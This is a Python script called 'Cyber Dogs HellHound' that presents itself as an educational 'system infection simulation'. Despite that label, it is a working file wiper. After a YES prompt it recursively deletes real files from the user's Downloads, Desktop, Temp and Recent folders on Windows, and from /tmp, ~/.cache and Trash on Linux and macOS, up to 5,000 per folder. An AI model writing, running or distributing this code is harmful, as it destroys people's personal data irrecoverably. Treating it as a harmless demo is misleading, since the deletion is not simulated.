import os
import sys
import platform
import time
import shutil
import glob
from pathlib import Path

# Configuration
LOG_FREQUENCY = 50
MAX_FILES_LIMIT = 5000
DELAY_BETWEEN_DELETIONS = 0.001  # 1ms delay for visual effect

def display_hellhound_message():
    """Display HellHound message - educational warning"""
    print("\033[91m" + "="*60)
    print("     CYBER DOGS HELLHOUND - EDUCATIONAL DEMONSTRATION")
    print("="*60 + "\033[0m")
    print("\n\033[91m💀 SYSTEM INFECTION SIMULATION 💀\033[0m")
    print("This is a DESTRUCTIVE demonstration tool.")
    print("⚠️  EDUCATIONAL USE ONLY - NOT STEALTHY BY DESIGN ⚠️")
    print("\n\033[93mCyberdogs HellHound has been released.")
    print("Demonstrating file deletion capabilities...\033[0m")
    print("\n" + "="*60)
    time.sleep(2)

def get_target_paths():
    """
    Get platform-specific target paths for deletion.
    Windows: Temp, AppData, Downloads, Desktop
    Linux/Mac: /tmp, home directory cache
    """
    system = platform.system()
    paths = []
    
    if system == "Windows":
        username = os.getenv("USERNAME")
        userprofile = os.getenv("USERPROFILE")
        
        paths = [
            os.path.join(userprofile, "AppData", "Local", "Temp"),
            os.path.join(userprofile, "Downloads"),
            os.path.join(userprofile, "Desktop"),
            os.path.join(userprofile, "AppData", "Roaming", "Microsoft", "Windows", "Recent"),
        ]
    elif system in ["Linux", "Darwin"]:  # Darwin is macOS
        home = os.path.expanduser("~")
        paths = [
            "/tmp",
            os.path.join(home, ".cache"),
            os.path.join(home, ".local", "share", "Trash"),
        ]
    
    # Filter to only existing paths
    return [p for p in paths if os.path.exists(p)]

def delete_file_with_logging(filepath, deleted_count):
    """
    Delete a single file with educational logging.
    
    Args:
        filepath (str): Path to file to delete
        deleted_count (int): Current deletion count
    
    Returns:
        bool: True if successfully deleted
    """
    try:
        if os.path.isfile(filepath) and not os.path.islink(filepath):
            size = os.path.getsize(filepath)
            os.remove(filepath)
            
            # Log every N deletions for educational visibility
            if deleted_count % LOG_FREQUENCY == 0:
                print(f"\033[93m[+] Deleted file #{deleted_count}: {os.path.basename(filepath)} ({size} bytes)\033[0m")
            
            time.sleep(DELAY_BETWEEN_DELETIONS)
            return True
            
    except PermissionError:
        if deleted_count % (LOG_FREQUENCY * 5) == 0:
            print(f"\033[91m[!] Permission denied: {os.path.basename(filepath)}\033[0m")
    except FileNotFoundError:
        pass  # File was already deleted
    except OSError as e:
        if deleted_count % (LOG_FREQUENCY * 5) == 0:
            print(f"\033[91m[!] OS Error on {os.path.basename(filepath)}: {e}\033[0m")
    
    return False

def delete_directory_contents(target_dir, max_files=MAX_FILES_LIMIT):
    """
    Recursively delete files from a directory.
    
    Args:
        target_dir (str): Directory to clean
        max_files (int): Maximum files to delete
    
    Returns:
        tuple: (files_deleted, directories_cleaned)
    """
    deleted_count = 0
    dir_count = 0
    
    print(f"\n\033[94m[*] Scanning directory: {target_dir}\033[0m")
    
    try:
        for root, dirs, files in os.walk(target_dir):
            # Process files
            for file in files:
                filepath = os.path.join(root, file)
                
                if delete_file_with_logging(filepath, deleted_count):
                    deleted_count += 1
                
                if deleted_count >= max_files:
                    print(f"\033[91m[!] Reached maximum file limit ({max_files})\033[0m")
                    return deleted_count, dir_count
            
            # Try to clean empty directories
            for dir_name in dirs:
                dirpath = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dirpath):  # If empty
                        os.rmdir(dirpath)
                        dir_count += 1
                        if dir_count % (LOG_FREQUENCY // 2) == 0:
                            print(f"\033[93m[+] Removed empty directory: {os.path.basename(dirpath)}\033[0m")
                except (OSError, PermissionError):
                    pass
                    
    except PermissionError:
        print(f"\033[91m[!] Permission denied accessing {target_dir}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error processing {target_dir}: {e}\033[0m")
    
    return deleted_count, dir_count

def delete_system_files():
    """
    Delete system files across target directories.
    Educational demonstration of infection impact.
    
    Returns:
        dict: Statistics about deletion
    """
    stats = {
        "total_files": 0,
        "total_dirs": 0,
        "paths_processed": 0
    }
    
    print("\n\033[91m" + "="*60)
    print("BEGINNING FILE DELETION SEQUENCE")
    print("="*60 + "\033[0m")
    
    target_paths = get_target_paths()
    
    if not target_paths:
        print("\033[91m[!] No target directories found!\033[0m")
        return stats
    
    for target_path in target_paths:
        print(f"\n\033[95m>>> Processing: {target_path}\033[0m")
        files_deleted, dirs_deleted = delete_directory_contents(target_path)
        
        stats["total_files"] += files_deleted
        stats["total_dirs"] += dirs_deleted
        stats["paths_processed"] += 1
        
        print(f"\033[92m[✓] Directory complete: {files_deleted} files, {dirs_deleted} directories removed\033[0m")
    
    return stats

def display_summary(stats):
    """Display final execution summary"""
    print("\n" + "="*60)
    print("\033[91m" + "HELLHOUND EXECUTION SUMMARY" + "\033[0m")
    print("="*60)
    print(f"\n📊 STATISTICS:")
    print(f"   Total Files Deleted: {stats['total_files']}")
    print(f"   Total Directories Removed: {stats['total_dirs']}")
    print(f"   Paths Processed: {stats['paths_processed']}")
    print(f"   Platform: {platform.system()}")
    print(f"   Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n" + "="*60)
    print("\033[91m[!] SYSTEM INFECTION SIMULATION COMPLETE\033[0m")
    print("\033[93m[*] This demonstration shows how ransomware/malware")
    print("    destroys data without hiding its activities.")
    print("    In real attacks, this would be concealed.\033[0m")
    print("="*60 + "\n")

def main():
    """Main execution function"""
    try:
        # Display educational warning
        display_hellhound_message()
        
        # Confirm user intent
        print("\n\033[91m⚠️  WARNING: This will DELETE files from your system!\033[0m")
        response = input("Continue? Type 'YES' to proceed: ").strip().upper()
        
        if response != "YES":
            print("\033[92m[*] Operation cancelled by user\033[0m")
            sys.exit(0)
        
        print("\033[91m[!] Proceeding with file deletion...\033[0m\n")
        
        # Execute deletion
        stats = delete_system_files()
        
        # Display summary
        display_summary(stats)
        
    except KeyboardInterrupt:
        print("\n\033[92m[*] HellHound interrupted by user\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\033[91m[!] Fatal error: {e}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()
